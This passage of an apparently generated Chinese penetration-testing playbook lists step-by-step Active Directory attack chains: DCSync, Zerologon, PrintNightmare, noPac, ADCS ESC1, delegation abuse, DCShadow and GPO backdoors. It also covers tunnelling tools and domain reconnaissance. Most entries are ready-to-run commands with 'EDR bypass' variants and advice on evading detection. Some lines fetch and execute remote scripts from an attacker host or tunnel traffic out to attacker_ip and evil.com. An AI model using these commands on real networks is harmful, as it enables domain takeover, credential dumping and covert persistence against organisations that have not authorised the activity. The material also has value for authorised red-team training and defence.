beacon> execute-assembly /path/to/tool.exe args
从内存执行.NET程序集
不落地执行
```

---


## 域渗透攻击

### 域内权限提升路径  `domain-privilege-escalation`
利用ACL错误配置进行域权限提升
子类：**权限提升** · tags: `acl` `privilege` `active-directory` `escalation`

**前置条件：** 域环境；普通域用户凭证；BloodHound分析结果

**攻击链：**

**1. BloodHound分析**
_查询到域管理员的最短路径_
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**2. 查找WriteDACL**  _[windows]_
_查找WriteDACL权限_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**3. 利用WriteDACL**  _[windows]_
_添加DCSync权限_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**4. 执行DCSync**  _[windows]_
_执行DCSync获取域管哈希_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**5. 查找GenericAll**  _[windows]_
_查找GenericAll权限_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**6. 重置密码**  _[windows]_
_重置目标用户密码_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR 绕过变体：**

**1. 隐蔽操作**
_指定域控制器操作_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```

**分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。

**OPSEC：** ACL修改会产生日志；优先使用隐蔽的权限；BloodHound可以发现攻击路径

---

### 跨域信任攻击  `domain-cross-trust`
利用域信任关系进行跨域攻击
子类：**跨域攻击** · tags: `trust` `cross-domain` `active-directory` `forest`

**前置条件：** 已获取源域权限；存在域信任关系；目标域信息

**攻击链：**

**1. 枚举信任关系**  _[windows]_
_枚举域信任关系_
```
Get-NetDomainTrust
```

**2. 枚举森林信任**  _[windows]_
_枚举森林信任关系_
```
Get-NetForestTrust
```

**3. 跨域用户枚举**  _[windows]_
_枚举目标域用户_
```
Get-NetUser -Domain target.domain.com
```

**4. 跨域组枚举**  _[windows]_
_枚举目标域组_
```
Get-NetGroup -Domain target.domain.com
```

**5. SID History攻击**  _[windows]_
_利用SID History跨域提权_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```

**6. 跨域票据**  _[windows]_
_请求目标域票据_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

**EDR 绕过变体：**

**1. 隐蔽跨域**
_指定目标域控制器枚举_
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```

**分析：** 跨域信任攻击可以利用信任关系从低安全域向高安全域移动。

**OPSEC：** 跨域攻击会产生日志；SID History需要特殊权限；森林信任更安全

---

### Zerologon攻击  `zerologon`
CVE-2020-1472 Netlogon提权
子类：**Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**前置条件：** 可访问域控制器RPC

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python zerologon_tester.py DC_NAME DC_IP
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python zerologon_exploit.py DC_NAME DC_IP
将DC密码置空
```

**3. 导出哈希**  _[linux]_
_导出哈希_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
导出域内所有哈希
```

**4. 恢复密码**  _[linux]_
_恢复密码_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
恢复域控密码避免破坏
```

---

### PrintNightmare攻击  `printnightmare`
CVE-2021-34527 打印服务漏洞
子类：**PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**前置条件：** 可访问打印服务RPC

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测打印服务_
```
rpcdump.py @DC_IP | grep MS-RPRN
检查打印服务是否可用
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
加载恶意DLL获取SYSTEM权限
```

**3. Impacket利用**  _[linux]_
_使用Impacket_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
触发加载远程DLL
```

---

### PetitPotam攻击  `petitpotam`
CVE-2021-36942 强制认证攻击
子类：**PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**前置条件：** 可访问EFSRPC接口

**攻击链：**

**1. 启动中继**  _[linux]_
_启动NTLM中继_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
设置NTLM中继到ADCS
```

**2. 触发认证**  _[linux]_
_触发认证_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
强制DC向攻击者认证
```

**3. 获取证书**  _[linux]_
_获取证书_
```
中继成功后获取用户证书
使用证书进行Pass-the-Cert
```

---

### noPac/SAMAccountName攻击  `samaccountname`
CVE-2021-42278/CVE-2021-42287 域提权
子类：**noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**前置条件：** 普通域用户权限

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取域管权限
```

**3. 攻击原理**
_攻击原理_
```
1. 创建机器账户(名称类似DC)
2. 清除SPN
3. 请求TGT
4. 删除机器账户
5. 获取域管TGT
```

---

### ADCS滥用攻击  `adcs-abuse`
Active Directory证书服务滥用
子类：**ADCS** · tags: `adcs` `certificate` `domain`

**前置条件：** ADCS服务可访问

**攻击链：**

**1. 枚举ADCS**  _[linux]_
_枚举ADCS配置_
```
certipy find -u user@domain -p password -dc-ip DC_IP
枚举证书模板
```

**2. 请求用户证书**  _[linux]_
_请求证书_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
请求用户证书
```

**3. Pass-the-Cert**  _[linux]_
_使用证书认证_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
使用证书获取TGT
```

**4. Rubeus请求**  _[windows]_
_Rubeus利用_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
使用Rubeus请求TGT
```

---

### ADCS ESC1漏洞  `adcs-esc1`
证书模板ESC1滥用
子类：**ADCS** · tags: `adcs` `esc1` `certificate`

**前置条件：** 存在ESC1配置的模板

**攻击链：**

**1. 识别ESC1**  _[linux]_
_识别漏洞模板_
```
certipy find -u user@domain -p password -vulnerable
查找ESC1漏洞模板
```

**2. 利用ESC1**  _[linux]_
_请求域管证书_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
指定SAN为域管
```

**3. 认证为域管**  _[linux]_
_认证为域管_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
使用证书认证为域管
```

---

### 约束委派攻击  `constrained-delegation`
利用约束委派进行横向移动
子类：**委派攻击** · tags: `delegation` `constrained` `kerberos`

**前置条件：** 存在约束委派配置的账户

**攻击链：**

**1. 查找约束委派**  _[windows]_
_查找约束委派账户_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
或
bloodhound查询
```

**2. 获取服务票据**  _[windows]_
_S4U2Self + S4U2Proxy_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
获取域管的服务票据
```

**3. 使用票据**  _[windows]_
_注入票据_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
注入票据并访问服务
```

---

### 基于资源的约束委派  `resource-delegation`
利用RBCD进行权限提升
子类：**委派攻击** · tags: `rbcd` `delegation` `kerberos`

**前置条件：** 对目标对象有WriteDACL权限

**攻击链：**

**1. 创建机器账户**  _[windows]_
_创建机器账户_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
创建新的机器账户
```

**2. 配置RBCD**  _[windows]_
_配置RBCD_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
设置委派关系
```

**3. 利用RBCD**  _[windows]_
_利用RBCD_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
获取域管票据
```

---

### DCShadow攻击  `dcshadow-attack`
伪造域控制器注入数据
子类：**DCShadow** · tags: `dcshadow` `domain` `injection`

**前置条件：** 域管理员权限；可注册新DC

**攻击链：**

**1. 注册伪造DC**  _[windows]_
_注册伪造DC_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
注册伪造DC并修改对象属性
```

**2. 推送更改**  _[windows]_
_推送更改_
```
在另一个终端:
mimikatz # lsadump::dcshadow /push
推送更改到真实DC
```

**3. 常见利用**  _[windows]_
_常见利用场景_
```
修改用户组:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
添加SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```

---

### 组策略滥用  `group-policy-abuse`
滥用组策略进行横向移动
子类：**组策略** · tags: `gpo` `group-policy` `domain`

**前置条件：** GPO编辑权限

**攻击链：**

**1. 查找可编辑GPO**  _[windows]_
_查找可编辑GPO_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
查找Domain Users可编辑的GPO
```

**2. 添加计划任务**  _[windows]_
_添加计划任务_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
添加立即执行的计划任务
```

**3. 添加注册表项**  _[windows]_
_添加注册表启动项_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```

---

### SAM The Admin攻击  `sam-the-admin`
CVE-2021-42278/CVE-2021-42287域提权
子类：**SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**前置条件：** 域用户权限；域控制器存在漏洞

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取域控权限_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取SYSTEM Shell
```

**3. 执行命令**  _[linux]_
_执行命令_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```

---

### NoAuth攻击  `noauth`
CVE-2022-33679 Kerberos认证绕过
子类：**NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**前置条件：** 域用户权限；目标账户有RC4密钥

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取TGT_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
获取目标用户TGT
```

**3. 使用TGT**  _[linux]_
_使用获取的TGT_
```
设置KRB5CCNAME环境变量
export KRB5CCNAME=administrator.ccache
使用psexec.py等工具
```

---


## 隧道代理

### FRP内网穿透  `tunnel-frp`
使用FRP建立内网穿透隧道
子类：**TCP隧道** · tags: `frp` `tunnel` `proxy` `nat`

**前置条件：** 公网服务器；内网机器可访问公网；FRP工具

**攻击链：**

**1. 服务端配置**  _[linux]_
_FRP服务端配置文件frps.ini_
```
[common]
bind_port = 7000
```

**2. 客户端配置**  _[windows]_
_FRP客户端配置文件frpc.ini_
```
[common]
server_addr = attacker_ip
server_port = 7000

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389
```

**3. 启动服务端**  _[linux]_
_启动FRP服务端_
```
./frps -c frps.ini
```

**4. 启动客户端**  _[windows]_
_启动FRP客户端_
```
frpc.exe -c frpc.ini
```

**分析：** FRP可以建立TCP隧道，将内网服务映射到公网。

**OPSEC：** FRP流量可能被检测；考虑使用加密传输；注意隐藏进程

---

### Chisel内网穿透  `tunnel-chisel`
使用Chisel建立内网穿透隧道
子类：**HTTP隧道** · tags: `chisel` `tunnel` `proxy` `http`

**前置条件：** 公网服务器；内网机器可访问公网；Chisel工具

**攻击链：**

**1. 服务端**  _[linux]_
_启动Chisel服务端_
```
./chisel server -p 8000 --reverse
```

**2. 反向SOCKS**  _[windows]_
_建立反向SOCKS代理_
```
chisel.exe client attacker_ip:8000 R:socks
```

**3. 端口转发**  _[windows]_
_端口转发_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

**分析：** Chisel可以建立HTTP隧道，穿透防火墙。

**OPSEC：** Chisel使用HTTP协议；可以绑定域名伪装；流量加密

---

### ReGeorg隧道  `tunnel-regeorg`
通过Web Shell建立隧道
子类：**ReGeorg** · tags: `tunnel` `regeorg` `proxy`

**前置条件：** Web Shell上传；支持脚本语言

**攻击链：**

**1. 上传隧道脚本**
_上传对应语言的隧道脚本_
```
上传tunnel.aspx/tunnel.jsp/tunnel.php到目标Web服务器
```

**2. 建立隧道**  _[linux]_
_启动SOCKS代理_
```
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
```

**3. 配置代理**  _[linux]_
_通过代理扫描_
```
proxychains nmap -sT -Pn target
```

---

### SSH本地转发  `tunnel-ssh-local`
SSH本地端口转发
子类：**SSH** · tags: `ssh` `tunnel` `local`

**前置条件：** SSH访问权限

**攻击链：**

**1. 本地转发**  _[linux]_
_将目标80端口映射到本地8080_
```
ssh -L 8080:target:80 user@jump
```

---

### SSH远程转发  `tunnel-ssh-remote`
SSH远程端口转发
子类：**SSH** · tags: `ssh` `tunnel` `remote`

**前置条件：** SSH访问权限

**攻击链：**

**1. 远程转发**  _[linux]_
_将本地80端口映射到远程8080_
```
ssh -R 8080:localhost:80 user@jump
```

---

### SSH动态转发  `tunnel-ssh-dynamic`
SSH动态SOCKS代理
子类：**SSH** · tags: `ssh` `tunnel` `socks`

**前置条件：** SSH访问权限

**攻击链：**

**1. 动态转发**  _[linux]_
_创建SOCKS代理_
```
ssh -D 1080 user@jump
```

**2. 使用代理**  _[linux]_
_通过SOCKS代理访问_
```
proxychains nmap -sT -Pn target
```

---

### DNS隧道  `tunnel-dns`
通过DNS协议建立隧道
子类：**DNS** · tags: `dns` `tunnel` `covert`

**前置条件：** DNS解析权限；可控域名

**攻击链：**

**1. 使用dnscat2**  _[linux]_
_启动dnscat2服务器_
```
ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
```

**2. 客户端连接**  _[windows]_
_客户端连接到服务器_
```
dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
```

**3. 建立隧道**  _[linux]_
_建立SOCKS隧道_
```
session -i 1
listen 127.0.0.1:1080 10.0.0.1:1080
```

---

### ICMP隧道  `tunnel-icmp`
通过ICMP协议建立隧道
子类：**ICMP** · tags: `icmp` `tunnel` `covert`

**前置条件：** ICMP允许通过；管理员权限

**攻击链：**

**1. 使用icmptunnel**  _[linux]_
_服务端启动_
```
icmptunnel -s 10.0.0.1
```

**2. 客户端连接**  _[linux]_
_客户端连接_
```
icmptunnel -c attacker.com
```

---

### Ligolo隧道  `tunnel-ligolo`
Ligolo内网穿透工具
子类：**Ligolo** · tags: `ligolo` `tunnel` `proxy`

**前置条件：** 可执行代理程序

**攻击链：**

**1. 启动服务端**  _[linux]_
_启动Ligolo代理服务_
```
sudo proxy -selfcert
```

**2. 运行代理**  _[windows]_
_目标机器运行代理_
```
agent.exe -connect attacker:11601 -ignore-cert
```

**3. 创建隧道**  _[linux]_
_创建隧道接口_
```
session
start
```

---

### SOCKS代理  `socks-proxy`
建立SOCKS代理访问内网
子类：**SOCKS** · tags: `socks` `proxy` `tunnel`

**前置条件：** 已有内网访问点

**攻击链：**

**1. SSH SOCKS代理**  _[linux]_
_SSH动态端口转发_
```
ssh -D 1080 user@jumpserver
或
ssh -D 1080 -N -f user@jumpserver
```

**2. ProxyChains配置**  _[linux]_
_配置ProxyChains_
```
编辑 /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

使用:
proxychains nmap -sT target
```

**3. Cobalt Strike SOCKS**  _[windows]_
_CS SOCKS代理_
```
beacon> socks 1080
在CS中启动SOCKS代理
```

**4. Metasploit SOCKS**  _[linux]_
_MSF SOCKS代理_
```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

---

### Ngrok内网穿透  `tunnel-ngrok`
使用Ngrok建立内网穿透
子类：**Ngrok** · tags: `ngrok` `tunnel` `penetration`

**前置条件：** Ngrok账号；可访问外网

**攻击链：**

**1. 安装Ngrok**
_安装并配置Ngrok_
```
下载: https://ngrok.com/download
tar -xvzf ngrok.zip
./ngrok authtoken YOUR_TOKEN
```

**2. HTTP隧道**
_创建HTTP隧道_
```
./ngrok http 80
将本地80端口映射到公网
```

**3. TCP隧道**
_创建TCP隧道_
```
./ngrok tcp 3389
将本地3389端口映射到公网
```

**4. 自定义域名**
_使用自定义域名_
```
./ngrok http -hostname=custom.domain.com 80
```

---

### EW内网穿透  `tunnel-ew`
使用EW建立内网穿透
子类：**EW** · tags: `ew` `tunnel` `socks`

**前置条件：** 已有内网访问点

**攻击链：**

**1. 正向代理**  _[linux]_
_正向SOCKS代理_
```
./ew -s ssocksd -l 1080
在跳板机上启动SOCKS代理
```

**2. 反向代理**  _[linux]_
_反向SOCKS代理_
```
攻击机: ./ew -s rcsocks -l 1080 -e 8888
跳板机: ./ew -s rssocks -d attacker_ip -e 8888
```

**3. 多级级联**  _[linux]_
_多级级联_
```
./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
多级跳板穿透
```

---

### Venom内网穿透  `tunnel-venom`
使用Venom建立内网穿透
子类：**Venom** · tags: `venom` `tunnel` `socks`

**前置条件：** 已有内网访问点

**攻击链：**

**1. 启动服务端**  _[linux]_
_启动服务端_
```
./venom_server -lport 9999
在攻击机启动服务端
```

**2. 连接客户端**
_连接服务端_
```
./venom_client -rhost attacker_ip -rport 9999
在跳板机连接服务端
```

**3. 建立SOCKS**
_建立SOCKS代理_
```
Venom > socks 1080
建立SOCKS代理
```

**4. 端口转发**
_端口转发_
```
Venom > lforward 127.0.0.1 3389 13389
将内网3389转发到本地13389
```

---


## 信息收集

### BloodHound域分析  `bloodhound-enumeration`
使用BloodHound分析Active Directory攻击路径
子类：**域分析** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`

**前置条件：** 域环境；域用户凭证；BloodHound工具

**攻击链：**

**1. SharpHound采集**  _[windows]_
_使用SharpHound采集域信息_
```
SharpHound.exe -c All
```

**2. PowerShell采集**  _[windows]_
_通过PowerShell远程加载采集_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All  # security-allowlist: SEC005
```

**3. bloodhound-python**  _[linux]_
_使用Python版本采集_
```
bloodhound-python -u user -p password -d target.com -ns dc_ip
```

**4. 指定域控制器**  _[windows]_
_指定域控制器采集_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
```

**5. 启动Neo4j**  _[linux]_
_启动Neo4j数据库_
```
sudo neo4j console
```

**6. Cypher查询域管**
_查询域管理员用户_
```
MATCH (n:User) WHERE n.admincount=true RETURN n
```

**7. 查询攻击路径**
_查询到域管理员的最短路径_
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**EDR 绕过变体：**

**1. 隐蔽采集**
_随机化文件名避免检测_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
```

**分析：** BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。

**OPSEC：** BloodHound采集会产生大量LDAP查询；可能触发域控制器告警；建议在非工作时间执行

---

### SPN扫描  `spn-scan`
扫描域内服务主体名称
子类：**SPN** · tags: `spn` `kerberos` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 查询所有SPN**  _[windows]_
_查询域内所有SPN_
```
setspn -T domain.com -Q */*
```

**2. PowerShell查询**  _[windows]_
_PowerShell查询SPN用户_
```
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

**3. Impacket查询**  _[linux]_
_Impacket查询SPN_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```

**4. 查询特定服务**  _[windows]_
_查询HTTP服务的SPN_
```
setspn -T domain.com -Q HTTP/*
```

**5. 查找SQL服务**  _[windows]_
_查询MSSQL服务的SPN_
```
setspn -T domain.com -Q MSSQLSvc/*
```

**分析：** SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。

**OPSEC：** SPN查询是正常的域操作；不会触发明显告警；可用于后续Kerberoasting攻击

---

### 内网端口扫描  `port-scan`
内网端口扫描与服务识别
子类：**端口扫描** · tags: `nmap` `port-scan` `enumeration`

**前置条件：** 内网访问权限；扫描工具

**攻击链：**

**1. 快速扫描**  _[linux]_
_快速扫描常用端口_
```
nmap -sS -T4 -F 192.168.1.0/24
```

**2. 全端口扫描**  _[linux]_
_扫描所有65535端口_
```
nmap -sS -p- 192.168.1.1
```

**3. 服务识别**  _[linux]_
_服务版本探测和脚本扫描_
```
nmap -sV -sC 192.168.1.1
```

**4. 内网存活探测**  _[linux]_
_Ping扫描发现存活主机_
```
nmap -sn 192.168.1.0/24
```

**5. Masscan快速扫描**  _[linux]_
_高速端口扫描_
```
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

**6. 操作系统识别**  _[linux]_
_识别目标操作系统_
```
nmap -O 192.168.1.1
```

**7. UDP扫描**  _[linux]_
_扫描常用UDP端口_
```
nmap -sU --top-ports 20 192.168.1.1
```

**8. 漏洞扫描**  _[linux]_
_使用漏洞扫描脚本_
```
nmap --script vuln 192.168.1.1
```

**EDR 绕过变体：**

**1. 隐蔽扫描**
_低速分片扫描，添加随机数据_
```
nmap -sS -T2 -f --data-length 50 192.168.1.1
```

**2. 诱饵扫描**
_使用诱饵IP混淆扫描来源_
```
nmap -sS -D RND:10 192.168.1.1
```

**分析：** 端口扫描可以发现内网中开放的服务，识别潜在的攻击目标。

**OPSEC：** 高速扫描可能触发IDS告警；建议使用较低速率；分时段进行扫描

---

### 域信息收集  `domain-recon`
Active Directory域环境信息收集
子类：**域信息** · tags: `active-directory` `domain` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 域信息**  _[windows]_
_获取域信息_
```
net config workstation
```

**2. 域控制器**  _[windows]_
_列出域控制器_
```
nltest /dclist:domain.com
```

**3. 域用户**  _[windows]_
_列出域用户_
```
net user /domain
```

**4. 域管理员**  _[windows]_
_列出域管理员组_
```
net group "Domain Admins" /domain
```

**5. 域信任关系**  _[windows]_
_列出域信任关系_
```
nltest /domain_trusts
```

**6. PowerView收集**  _[windows]_
_使用PowerView收集域信息_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain  # security-allowlist: SEC005
```

**7. 获取域策略**  _[windows]_
_获取域密码策略_
```
Get-DomainPolicy
```

**8. 获取域控制器**  _[windows]_
_获取域控制器信息_
```
Get-NetDomainController
```

**分析：** 域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。

**OPSEC：** 域信息收集是正常操作；不会触发明显告警；为后续攻击做准备

---

### 网络信息收集  `network-recon`
内网网络拓扑和配置信息收集
子类：**网络信息** · tags: `network` `enumeration` `topology`

**前置条件：** 内网访问权限

**攻击链：**

**1. 网络配置**  _[windows]_
_查看网络配置_
```
ipconfig /all
```

**2. 路由表**  _[windows]_
_查看路由表_
```
route print
```

**3. ARP缓存**  _[windows]_
_查看ARP缓存_
```
arp -a
```

**4. 网络连接**  _[windows]_
_查看网络连接_
```
netstat -ano
```

**5. DNS缓存**  _[windows]_
_查看DNS缓存_
```
ipconfig /displaydns
```

**6. Linux网络配置**  _[linux]_
_Linux查看网络配置_
```
ifconfig -a
```

**7. Linux路由表**  _[linux]_
_Linux查看路由表_
```
route -n
```

**8. traceroute**  _[windows]_
_追踪路由_
```
tracert target_ip
```

**分析：** 网络信息收集可以了解内网拓扑、网段划分、网关等信息。

**OPSEC：** 这些是正常的网络管理命令；不会触发告警；为后续横向移动做准备

---

### 共享枚举  `share-enum`
枚举网络共享资源
子类：**共享** · tags: `smb` `share` `enumeration`

**前置条件：** 内网访问权限

**攻击链：**

**1. 枚举共享**  _[windows]_
_查看本地共享_
```
net share
```

**2. 查看远程共享**  _[windows]_
_查看远程机器共享_
```
net view \\target_ip
```

**3. SMBMap枚举**  _[linux]_
_使用SMBMap枚举共享_
```
smbmap -H target_ip -u user -p password
```

**4. CrackMapExec枚举**  _[linux]_
_使用CME枚举共享_
```
crackmapexec smb target_ip -u user -p password --shares
```

**5. smbclient枚举**  _[linux]_
_使用smbclient枚举_
```
smbclient -L target_ip -U user%password
```

**6. PowerView枚举**  _[windows]_
_查找有趣的共享文件_
```
Find-InterestingDomainShareFile
```

**分析：** 共享枚举可以发现敏感文件、配置文件、备份文件等有价值的信息。

**OPSEC：** 共享枚举是正常操作；可能发现敏感文件；注意文件访问日志

---

### 用户枚举  `user-enum`
枚举域内用户信息
子类：**用户** · tags: `user` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出域用户**  _[windows]_
_列出所有域用户_
```
net user /domain
```

**2. 用户详细信息**  _[windows]_
_查看用户详细信息_
```
net user username /domain
```

**3. PowerView枚举**  _[windows]_
_使用PowerView枚举用户_
```
Get-NetUser | select samaccountname,description,admincount
```

**4. 查找管理员**  _[windows]_
_查找域管理员_
```
Get-NetUser -AdminCount | select samaccountname
```

**5. 查找活跃用户**  _[windows]_
_查找最近登录的用户_
```
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
```

**6. Impacket枚举**  _[linux]_
_使用Impacket枚举域用户_
```
GetADUsers.py -all domain/user:password -dc-ip dc_ip
```

**分析：** 用户枚举可以发现高价值目标、活跃用户、服务账户等。

**OPSEC：** 用户枚举是正常操作；为后续攻击选择目标；注意识别蜜罐账户

---

### 组枚举  `group-enum`
枚举域内组信息
子类：**组** · tags: `group` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出域组**  _[windows]_
_列出所有域组_
```
net group /domain
```

**2. 组成员**  _[windows]_
_查看域管理员组成员_
```
net group "Domain Admins" /domain
```

**3. PowerView枚举**  _[windows]_
_使用PowerView枚举组_
```
Get-NetGroup | select samaccountname,admincount
```

**4. 查找高权限组**  _[windows]_
_查找高权限组_
```
Get-NetGroup -AdminCount | select samaccountname
```

**5. 组成员关系**  _[windows]_
_获取组成员_
```
Get-NetGroupMember "Domain Admins" | select membername
```

**6. 递归组成员**  _[windows]_
_递归获取组成员（包括嵌套组）_
```
Get-NetGroupMember "Domain Admins" -Recurse
```

**分析：** 组枚举可以发现高权限组、组成员关系、嵌套组等。

**OPSEC：** 组枚举是正常操作；重点关注高权限组；注意嵌套组关系

---

### GPO枚举  `gpo-enum`
枚举组策略对象
子类：**GPO** · tags: `gpo` `group-policy` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出GPO**  _[windows]_
_列出所有GPO_
```
Get-GPO -All
```

**2. PowerView枚举**  _[windows]_
_使用PowerView枚举GPO_
```
Get-NetGPO | select displayname,whencreated
```

**3. GPO权限**  _[windows]_
_查找GPO中的受限组_
```
Get-NetGPOGroup
```

**4. GPP密码**  _[windows]_
_查找GPP中的密码_
```
Get-NetGPPPassword
```

**5. 查找可利用GPO**  _[windows]_
_查找用户受哪些GPO影响_
```
Find-GPOLocation -UserName user
```

**分析：** GPO枚举可以发现组策略配置、GPP密码、受限组等信息。

**OPSEC：** GPP密码是常见的信息泄露点；GPO可能包含敏感配置；注意GPO修改权限

---

### ACL枚举  `acl-enum`
枚举访问控制列表
子类：**ACL** · tags: `acl` `access-control` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. PowerView ACL枚举**  _[windows]_
_获取用户对象的ACL_
```
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
```

**2. 查找危险权限**  _[windows]_
_查找有趣的ACL权限_
```
Find-InterestingDomainAcl -ResolveGUIDs
```

**3. 查找WriteDACL**  _[windows]_
_查找WriteDACL权限_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**4. 查找GenericAll**  _[windows]_
_查找GenericAll权限_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**5. BloodHound ACL分析**
_BloodHound查询ACL关系_
```
MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
```

**分析：** ACL枚举可以发现权限配置错误，如WriteDACL、GenericAll等危险权限。

**OPSEC：** ACL错误配置是常见的提权路径；重点关注高价值目标；BloodHound可可视化ACL关系

---

### 信任关系枚举  `trust-enum`
枚举域信任关系
子类：**信任关系** · tags: `trust` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 域信任关系**  _[windows]_
